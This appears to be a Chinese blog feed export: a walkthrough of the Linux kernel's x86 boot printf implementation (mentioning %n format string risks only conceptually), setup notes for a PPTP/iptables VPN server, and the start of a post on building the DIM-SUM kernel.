<p>printf实现还隐藏了很多参数,例如%n,printf返回值是啥你知道吗?格式化字符串漏洞成因何在?这里分析Linux内核中的printf实现,而非glibc库中的标准实现(我们用的肯定是标准库咯,不过很复杂<del>_</del>),因为这里没有%f等浮点类型的匹配,简单一些.</p>
</blockquote>
<span id="more"></span>


<p>参考资料:<br><a href="https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c">Linus的github仓库https://github.com/torvalds/linux/blob/master/arch/x86/boot/printf.c</a></p>
<h2 id="printf大体"><a href="#printf大体" class="headerlink" title="printf大体"></a>printf大体</h2><p>首先我们找到printf函数的实现(由于x86体系容易理解便选择了这个体系),可以看到申请了1024个字节的空间来保存要格式化串,有人会问要是我给出的参数超过了1024不就缓冲区溢出程序会crash掉吗?我觉得编译器肯定会察觉到的,有兴趣的自己鼓捣下…大体就是将传递进来的参数根据压栈的顺序逐个取出并格式化成字符串,这个是在vsprintf函数实现的,返回值是两个地址的差,即本次输出的字符串数目.最后调用puts函数向终端输出.最后后才返回本次输出字符串数目.<br><img src="/images/printf.png" alt="printf"></p>
<h2 id="va-系类宏"><a href="#va-系类宏" class="headerlink" title="va_系类宏"></a>va_系类宏</h2><p>然后我们利用sublime的插件来jump到<code>va_list</code>的定义,发现是一个char*的typedef.干脆就一起来认识一下<code>va_</code>系列的宏.</p>
<p><code>acpi_native_int</code>也是一个typedef,根据最开始的配置决定是s32还是s64,在x86这里肯定就是有符号的32位了,即int类型的.<code>_AUPBND</code>和<code>_ADNBND</code>两个宏的值一样.而<code>_bnd</code>这个宏在32b体系下给出的是类型X的大小的4字节对齐值.在printf里面用的时候关系不是很大,因为格式化的时候不会是很大结构体(%结构体根本没实现啊),纵然是小于4字节的char,short之类的,存的时候可能是那么多字节,但是压栈的时候编译器会毫不犹豫地安排用一个寄存器扩展并压入栈顶的指令,所以不用担心,可以认为这个宏在printf里面仅仅是4字节对齐没问题的.<code>va_start(ap, A)</code>这个宏接到A(fmt)地址,再+4赋值给ap,原因在于A(fmt)是printf的第一个参数(格式化字符串含有%的部分),+4之后才能对准第一个真正要格式化的参数.而<code>va_arg(ap, T)</code>目的是先使得ap移往后一个参数但是返回的值确实本次参数的值,比较巧妙.<code>va_end(ap)</code>仅仅为了保证安全而象征性地将ap指向NULL.<br><img src="/images/va_arg.png" alt="va_arg"></p>
<h2 id="vsprintf"><a href="#vsprintf" class="headerlink" title="vsprintf"></a>vsprintf</h2><p>vsprintf这个函数有几个重要的局部变量需要注意,英文注释写的很清楚了,flags标志主要是关于数字对齐这一块,等到number函数被调用的时候会判断的.field_width字段主要是占用宽度计算.precision是精度计算,其实是输出个字符个数控制.qualifier是对于长整型的扩展,例如将int转为long.(x86下int=long)<br><img src="/images/vsprintf.png" alt="vsprintf"><br>在定义了局部变量之后,一个for循环遍历fmt所有的字符,取出特别的%来格式化,最后计算地址偏移便完结了.当找到第一个%的时候,首先处理flags字段,定义个标号repeat来快速跳出,虽然听说C标准不推荐使用goto语句,但是能够提高效率为什么不能用呢?代码片段如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEROPAD	1		<span class="comment">/* pad with zero */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIGN	2		<span class="comment">/* unsigned/signed long */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PLUS	4		<span class="comment">/* show plus */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPACE	8		<span class="comment">/* space if plus */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEFT	16		<span class="comment">/* left justified */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SMALL	32		<span class="comment">/* Must be 32 == 0x20 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPECIAL	64		<span class="comment">/* 0x */</span></span></span><br><span class="line"><span class="comment">/* process flags */</span></span><br><span class="line">		flags = <span class="number">0</span>;</span><br><span class="line">	      repeat:</span><br><span class="line">		++fmt;		<span class="comment">/* this also skips first &#x27;%&#x27; */</span></span><br><span class="line">		<span class="keyword">switch</span> (*fmt) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">			flags |= LEFT;</span><br><span class="line">			<span class="keyword">goto</span> repeat;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">			flags |= PLUS;</span><br><span class="line">			<span class="keyword">goto</span> repeat;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">			flags |= SPACE;</span><br><span class="line">			<span class="keyword">goto</span> repeat;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">			flags |= SPECIAL;</span><br><span class="line">			<span class="keyword">goto</span> repeat;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">			flags |= ZEROPAD;</span><br><span class="line">			<span class="keyword">goto</span> repeat;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>某些字段就不说了,用过printf的应该都知道的,其中的<code>#</code>作用就是方便16进制和8进制的格式化,例如<code>%#x</code>就会被默认加上<code>0x</code>,而<code>%#o</code>就会被默认加上<code>0</code>,具体可以看后面number函数实现就知道了.  </p>
<hr>
<blockquote>
<p>找工作太忙了,今天才得有空继续分析^~^(2016.10.17) </p>
</blockquote>
<hr>
<p>接下来就会去获得宽度字段,利用<code>isdigital</code>函数一步实现字符串转整型并使得fmt指针指向后续格式符.如果用<code>*</code>代替,将直接将压入的参数转为整型赋值为宽度字段.并根据正负号置标志位采取相应的对齐方式(默认为右对齐).  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* get field width */</span></span><br><span class="line">		field_width = <span class="number">-1</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">isdigit</span>(*fmt))</span><br><span class="line">			field_width = skip_atoi(&amp;fmt);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (*fmt == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">			++fmt;</span><br><span class="line">			<span class="comment">/* it&#x27;s the next argument */</span></span><br><span class="line">			field_width = va_arg(args, <span class="keyword">int</span>);</span><br><span class="line">			<span class="keyword">if</span> (field_width &lt; <span class="number">0</span>) &#123;</span><br><span class="line">				field_width = -field_width;</span><br><span class="line">				flags |= LEFT;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>再下来就是获取精度了,一般有浮点类型的就得保留多少位的精度.首先得在串中检测到有<code>.</code>字符,之后的处理跟宽度就差不多了.先保存相关的参数然后会传到另外的函数做具体处理的.对于有<code>l</code>,<code>L</code>,<code>h</code>跟在后面的将使得<code>qualifier</code>被置为其ascii码值.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* get the precision */</span></span><br><span class="line">		precision = <span class="number">-1</span>;</span><br><span class="line">		<span class="keyword">if</span> (*fmt == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">			++fmt;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">isdigit</span>(*fmt))</span><br><span class="line">				precision = skip_atoi(&amp;fmt);</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (*fmt == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">				++fmt;</span><br><span class="line">				<span class="comment">/* it&#x27;s the next argument */</span></span><br><span class="line">				precision = va_arg(args, <span class="keyword">int</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (precision &lt; <span class="number">0</span>)</span><br><span class="line">				precision = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* get the conversion qualifier */</span></span><br><span class="line">		qualifier = <span class="number">-1</span>;</span><br><span class="line">		<span class="keyword">if</span> (*fmt == <span class="string">&#x27;h&#x27;</span> || *fmt == <span class="string">&#x27;l&#x27;</span> || *fmt == <span class="string">&#x27;L&#x27;</span>) &#123;</span><br><span class="line">			qualifier = *fmt;</span><br><span class="line">			++fmt;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>之后就进入最后的格式化匹配了,根据提供的格式化类型对压入的参数进行相应操作.首先会使得base默认为10进制,如果类似%c的话,直接根据左右对齐方式填充空白符,中间以<code>int</code>类型为地址单元取得参数的值直接强制转化为<code>unsigned char</code>类型的字符.为什么呢?详情参考我的另外一篇<a href="http://www.rutk1t0r.cn/2016/08/21/memory-align/">文章</a>,我们需要知道这个是编译器自己这么压进去的就得这么去接收就行了.对于类似%s,首先取得参数首地址,然后调用安全的<code>strnlen</code>函数获取填充空白的长度.之后逐字符地拷贝,若非右对齐后续还需继续填充空白,<code>if</code>和<code>while</code>没有加<code>&#123;&#125;</code>可能看得不太清楚.建议源代码中的风格严谨一点好.对于%p如果没有字段宽度值则默认为2个指针大小的宽度,并使得flags的ZEROPAD置位.而后直接送往number函数继续处理.%n可是一个很生疏的东西,我猜测这个参数最初的目的是用于调试用的,可以检查本次printf调用在%n之前输出的字符个数,并将这个值赋给调用者传递进来的参数地址处,但是如果使用不当,就可能会造成<code>任意地址读写任意数据</code>的格式化字符串漏洞.<br>之后的几个参数大都是置位相应标志位而已,后期直接送往number函数处理,需要注意的是之前这几个参数后面完成后用的是<code>continue</code>,意思是直接跳转到最外面的<code>for</code>循环进行下一个字符的匹配,而%xXdiu后面接的是<code>break</code>,表示退出<code>switch</code>,转而进行后面的<code>h,L,l</code>的长类型的处理去了.还要注意在<code>switch case break</code>的结构中,如果<code>case</code>了第一个条件,之后如果没有遇到<code>break</code>,程序的控制流程将忽略后面的<code>case</code>条件,直接执行语句部分,直到遇见结束的<code>break</code>.因为这里已经出现了这种用法(匹配x的时候),所以应该注意一下,某些笔试题也会考察这个知识点.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* default base */</span></span><br><span class="line">		base = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span> (*fmt) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">			<span class="keyword">if</span> (!(flags &amp; LEFT))</span><br><span class="line">				<span class="keyword">while</span> (--field_width &gt; <span class="number">0</span>)</span><br><span class="line">					*str++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">			*str++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)va_arg(args, <span class="keyword">int</span>);</span><br><span class="line">			<span class="keyword">while</span> (--field_width &gt; <span class="number">0</span>)</span><br><span class="line">				*str++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">			s = va_arg(args, <span class="keyword">char</span> *);</span><br><span class="line">			len = strnlen(s, precision);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!(flags &amp; LEFT))</span><br><span class="line">				<span class="keyword">while</span> (len &lt; field_width--)</span><br><span class="line">					*str++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">			<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">				*str++ = *s++;</span><br><span class="line">			<span class="keyword">while</span> (len &lt; field_width--)</span><br><span class="line">				*str++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">			<span class="keyword">if</span> (field_width == <span class="number">-1</span>) &#123;</span><br><span class="line">				field_width = <span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">void</span> *);</span><br><span class="line">				flags |= ZEROPAD;</span><br><span class="line">			&#125;</span><br><span class="line">			str = number(str,</span><br><span class="line">				     (<span class="keyword">unsigned</span> <span class="keyword">long</span>)va_arg(args, <span class="keyword">void</span> *), <span class="number">16</span>,</span><br><span class="line">				     field_width, precision, flags);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">			<span class="keyword">if</span> (qualifier == <span class="string">&#x27;l&#x27;</span>) &#123;</span><br><span class="line">				<span class="keyword">long</span> *ip = va_arg(args, <span class="keyword">long</span> *);</span><br><span class="line">				*ip = (str - buf);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">int</span> *ip = va_arg(args, <span class="keyword">int</span> *);</span><br><span class="line">				*ip = (str - buf);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">			*str++ = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* integer number formats - set up the flags and &quot;break&quot; */</span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>:</span><br><span class="line">			base = <span class="number">8</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">			flags |= SMALL;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;X&#x27;</span>:</span><br><span class="line">			base = <span class="number">16</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>:</span><br><span class="line">			flags |= SIGN;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			*str++ = <span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">			<span class="keyword">if</span> (*fmt)</span><br><span class="line">				*str++ = *fmt;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				--fmt;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (qualifier == <span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">			num = va_arg(args, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (qualifier == <span class="string">&#x27;h&#x27;</span>) &#123;</span><br><span class="line">			num = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)va_arg(args, <span class="keyword">int</span>);</span><br><span class="line">			<span class="keyword">if</span> (flags &amp; SIGN)</span><br><span class="line">				num = (<span class="keyword">short</span>)num;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags &amp; SIGN)</span><br><span class="line">			num = va_arg(args, <span class="keyword">int</span>);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			num = va_arg(args, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">		str = number(str, num, base, field_width, precision, flags);</span><br><span class="line">	&#125;</span><br><span class="line">	*str = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> str - buf;</span><br></pre></td></tr></table></figure>

<h2 id="number函数"><a href="#number函数" class="headerlink" title="number函数"></a>number函数</h2><p>首先分析一下这个宏定义的作用,如果先看number函数里面用到这个宏居然是放在<code>[]</code>里面的,因此可以猜测作用是用来偏移寻址的.有些人会问,C语言里面可以这样用吗?(答案很明了了,不能用怎么编译通过呢?所以还是需要多看别人写的代码,有些用法不常用的但是如果好用就可以Get到了)编译器编译的时候能够生成合适的代码即可.这个宏的作用是求出n对base余数,并使得n变为商,同时”返回”余数__res.主要用于八进制和十六进制的数值与字符的转换.(不知是否C语言的思想是一切皆为表达式,据说类*nix操作系统和shell的核心思想分别是<code>一切皆为文件</code>和<code>一切皆为表达式</code>.)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __do_div(n, base) (&#123; \</span></span><br><span class="line"><span class="meta">int __res; \</span></span><br><span class="line"><span class="meta">__res = ((unsigned long) n) % (unsigned) base; \</span></span><br><span class="line"><span class="meta">n = ((unsigned long) n) / (unsigned) base; \</span></span><br><span class="line"><span class="meta">__res; &#125;)</span></span><br></pre></td></tr></table></figure>
<p>再来看number函数的实现,首先分析函数的参数以及返回值,作为软件工程师应该要做到文档清晰可理解,各个接口的参数以及返回值的作用解释清楚.<code>static</code>类型的函数表明这个函数仅仅在这个文件作用域可以调用,这样减少了命名冲突问题.<code>char *</code>返回值表明能够实现链式功能,可对比<code>strcpy</code>函数的实现.再来看参数,第一个str即上层传入的str首地址,表明要对上层传进来的参数空间进行修改.第二个<code>num</code>是对%idp等格式化的栈参数的一个拷贝.第三个<code>base</code>顾名思义就是进制基数了.第四个<code>size</code>即为对齐宽度.第五个为精度,最后一个为标志位字段.<br>首先定义一个静态的常量数组保存进制转换的字符,便于直接寻址取得相应字符赋值给str.<code>tmp[66]</code>我认为目前来看是有点长,它的作用是暂存num转换之后的数据,num最大为<code>long</code>的最大值,为2^64(64bit),也就是16个F,即16个字符即可,愚以为有点多余~~~.locase探测type字段的SMALL标志,不得不说SMALL标志位也是取得合理,32-&gt;第4位置位,使得可以很轻松地<code>或</code>运算实现大写字符-&gt;小写字符(ascii码相差32).如果<code>0</code>和<code>-</code>同时置位,gcc编译器会提示<code>warning: &#39;0&#39; flag ignored with &#39;-&#39; flag in gnu_printf format [-Wformat=]</code>,表明会忽略掉<code>0</code>的作用,具体实现也是这样.首先会判断是否有左对齐标志,有的话就用经典的<code>&amp;= ~</code>运算来清除相应标志位,这个在嵌入式开发里面很常见,一般是操作外设寄存器用的.在这里的逻辑是清除<code>补零</code>标志.这里也有一个健壮性的判断,不过number函数仅限于本文件调用,一般的开发者应该不会传入错误的base.字符<code>c</code>也是用来填充的,为<code>0</code>或者空格.接下来就是检测SIGH标志,并根据正负和0填充的需求占据<code>size</code>和置位<code>sign</code>.之后判断16进制和8进制情况,16进制的<code>size</code>减2是由于要填充<code>0x</code>或者<code>0X</code>,8进制只需要填充<code>0</code>即可.之后就开始进制转换成字符了,并根据<code>locase</code>的实际情况对于16进制翻转大小写字符.而对于数字0~9,由于他们的ascii码的第4位已经置位,所以或上1并不影响自身的值,而默认的大写字母第4位没有置位,如果程序员需要转换就可以转换.这个是很巧妙的!!!值得学习的技巧.传进来的<code>precision</code>表示精度,由于这里没有浮点匹配,这里就主要用来截取串的长度.如果<code>ZEROPAD</code>和<code>LEFT</code>都没有置位,就填充空格.然后根据进制继续填充数值.如果不是左对齐,就根据<code>size</code>的剩余大小继续填充<code>c</code>,后面就根据i的情况填充了,直到满足<code>size</code>这个宽度域为0.最后返回<code>str</code>的首地址.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">number</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">long</span> num, <span class="keyword">int</span> base, <span class="keyword">int</span> size, <span class="keyword">int</span> precision,</span></span></span><br><span class="line"><span class="params"><span class="function">		    <span class="keyword">int</span> type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* we are called with base 8, 10 or 16, only, thus don&#x27;t need &quot;G...&quot;  */</span></span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> digits[<span class="number">16</span>] = <span class="string">&quot;0123456789ABCDEF&quot;</span>; <span class="comment">/* &quot;GHIJKLMNOPQRSTUVWXYZ&quot;; */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> tmp[<span class="number">66</span>];</span><br><span class="line">	<span class="keyword">char</span> c, sign, locase;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* locase = 0 or 0x20. ORing digits or letters with &#x27;locase&#x27;</span></span><br><span class="line"><span class="comment">	 * produces same digits or (maybe lowercased) letters */</span></span><br><span class="line">	locase = (type &amp; SMALL);</span><br><span class="line">	<span class="keyword">if</span> (type &amp; LEFT)</span><br><span class="line">		type &amp;= ~ZEROPAD;</span><br><span class="line">	<span class="keyword">if</span> (base &lt; <span class="number">2</span> || base &gt; <span class="number">16</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	c = (type &amp; ZEROPAD) ? <span class="string">&#x27;0&#x27;</span> : <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">	sign = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (type &amp; SIGN) &#123;</span><br><span class="line">		<span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			sign = <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">			num = -num;</span><br><span class="line">			size--;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (type &amp; PLUS) &#123;</span><br><span class="line">			sign = <span class="string">&#x27;+&#x27;</span>;</span><br><span class="line">			size--;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (type &amp; SPACE) &#123;</span><br><span class="line">			sign = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">			size--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (type &amp; SPECIAL) &#123;</span><br><span class="line">		<span class="keyword">if</span> (base == <span class="number">16</span>)</span><br><span class="line">			size -= <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (base == <span class="number">8</span>)</span><br><span class="line">			size--;</span><br><span class="line">	&#125;</span><br><span class="line">	i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (num == <span class="number">0</span>)</span><br><span class="line">		tmp[i++] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">while</span> (num != <span class="number">0</span>)</span><br><span class="line">			tmp[i++] = (digits[__do_div(num, base)] | locase);</span><br><span class="line">	<span class="keyword">if</span> (i &gt; precision)</span><br><span class="line">		precision = i;</span><br><span class="line">	size -= precision;</span><br><span class="line">	<span class="keyword">if</span> (!(type &amp; (ZEROPAD + LEFT)))</span><br><span class="line">		<span class="keyword">while</span> (size-- &gt; <span class="number">0</span>)</span><br><span class="line">			*str++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> (sign)</span><br><span class="line">		*str++ = sign;</span><br><span class="line">	<span class="keyword">if</span> (type &amp; SPECIAL) &#123;</span><br><span class="line">		<span class="keyword">if</span> (base == <span class="number">8</span>)</span><br><span class="line">			*str++ = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (base == <span class="number">16</span>) &#123;</span><br><span class="line">			*str++ = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">			*str++ = (<span class="string">&#x27;X&#x27;</span> | locase);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!(type &amp; LEFT))</span><br><span class="line">		<span class="keyword">while</span> (size-- &gt; <span class="number">0</span>)</span><br><span class="line">			*str++ = c;</span><br><span class="line">	<span class="keyword">while</span> (i &lt; precision--)</span><br><span class="line">		*str++ = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">		*str++ = tmp[i];</span><br><span class="line">	<span class="keyword">while</span> (size-- &gt; <span class="number">0</span>)</span><br><span class="line">		*str++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h2><p>至于puts的实现应该就不难了,内核中有很多处代码.应该就是简单地逐字节地拷贝到某缓冲区,再由内核的IO调度机制向屏幕或者串口等字符驱动设备文件拷贝输出.一般在嵌入式开发里面串口输出的比较常见.而普通PC的CPU(类似以前8086时代的intel)可能是按照主板等的设计给显存预留出地址空间,只要CPU把数据送往那个地址空间(貌似是0x0B800)显示设备就能够打印出相应的字符.</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最起初的printf实现大概就这么多吧,可能内核开发者考虑到某些CPU没有浮点体系就没有把处理浮点类型的情况加进去的,标准的printf实现还是需要参考glibc库的.后期有空继续分析.对了,前面有说到<code>格式化字符串漏洞</code>参考看雪论坛这篇<a href="http://bbs.pediy.com/showthread.php?t=213153">文章</a>,如果没注册看不了的话先<a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458279936&idx=1&sn=2eb47265a0d170c45403d4b5d9097549&chksm=b181508a86f6d99c27d4b2c9281a573ac16284c3a7f7f6f3d9cad3a7452f3bcc22ba15616303&scene=0#wechat_redirect">戳这里吧</a></p>
]]></content>
      <categories>
        <category>study</category>
        <category>misc</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>Linux kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>常用VPN服务器配置</title>
    <url>/embpgp.github.io/2016/10/27/%E5%B8%B8%E7%94%A8VPN%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<span id="more"></span>

<p>参考资料:<br><a href="https://www.nigesb.com/setup-your-own-vpn-with-pptp.html">https://www.nigesb.com/setup-your-own-vpn-with-pptp.html</a><br><code>sudo apt-get install pptpd</code><br>编辑/etc/pptpd.conf<br><code>localip 10.0.0.1</code><br><code>remoteip 10.0.0.100-200</code></p>
<p>修改/etc/ppp/pptpd-options.pptpd</p>
<p><code>ms-dns 202.96.128.86</code><br><code>ms-dns 202.96.128.166</code></p>
<p>/etc/ppp/chap-secrets<br>次为：账号，协议，密码，ip地址。</p>
<p>编辑系统配置文件/etc/sysctl.conf</p>
<p>开启数据报文转发<br><code>net.ipv4.ip_forward = 1</code></p>
<p>立即生效<br><code>sysctl -p</code></p>
<p>防火墙配置相应规则和策略  </p>
<p><code>iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</code><br><code>iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356</code><br><code>iptables-save</code></p>
<p>系统环境：Debian-6 32-bit</p>
<p>iptables是即时生效的，所以无需重启，如果要停止iptables，请使用iptables -F命令，如果要iptables配置重启后仍然有效，请按如下操作步骤</p>
<p>1.创建/etc/iptables文件(文件名可以随意取)</p>
<p>2.创建/etc/network/if-pre-up.d/iptables文件，并给予其执行权限<br><code>root@hostname:~# touch /etc/network/if-pre-up.d/iptables</code><br><code>root@hostname:~# chmod +x /etc/network/if-pre-up.d/iptables</code></p>
<p>3.编辑/etc/network/if-pre-up.d/iptables文件，使其内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"> /sbin/iptables-restore &lt; /etc/iptables</span><br></pre></td></tr></table></figure>
<p> 4.配置iptables，过程略，配置好iptables后，将配置保存到/etc/iptables文件中即可<br> root@hostname:~# iptables-save &gt; /etc/iptables</p>
<p> //配置openvpn<br> <a href="http://www.zhengyali.com/?p=52">http://www.zhengyali.com/?p=52</a><br> <a href="http://www.zhengyali.com/?p=66">http://www.zhengyali.com/?p=66</a><br> <a href="http://blog.csdn.net/brad_chen/article/details/49633491">http://blog.csdn.net/brad_chen/article/details/49633491</a><br> <a href="http://openvpn.ustc.edu.cn/">http://openvpn.ustc.edu.cn/</a></p>
<p> openvpn之树莓派问题</p>
<p> <code>sudo apt-get purge openvpn liblzo2-2</code><br> <code>sudo apt-get install openvpn</code></p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>Configure</tag>
        <tag>network security</tag>
      </tags>
  </entry>
  <entry>
    <title>DIM-SUM学习</title>
    <url>/embpgp.github.io/2022/01/16/%E5%BC%80%E5%B9%B4%E7%AC%AC%E4%B8%80%E7%AF%87%20DIM-SUM%20%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<blockquote>
<p>DIM-SUM内核学习,先跑起来吧。</p>
</blockquote>
<span id="more"></span>
<hr>
<p><strong>参考资料</strong></p>
<ul>
<li><a href="https://gitee.com/xiebaoyou/dim-sum">DIM-SUM仓库</a></li>
</ul>
<hr>
<h1 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h1><p>之前很早有关注过作者，后面逐渐听说有设计操作系统内核的计划，今年偶然听说出了一本新书，就买来学习了。</p>
<h1 id="跑起来"><a href="#跑起来" class="headerlink" title="跑起来"></a>跑起来</h1><p>拿到书籍后里面有读者服务的二维码，所以就从那里面先拿到了源码包以及《答案.docx》。后续可以直接参考gitee上的教程跑。</p>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><blockquote>
<p>编译少库的问题自行搜索解决即可，我的系统是ubuntu 20.04</p>
</blockquote>
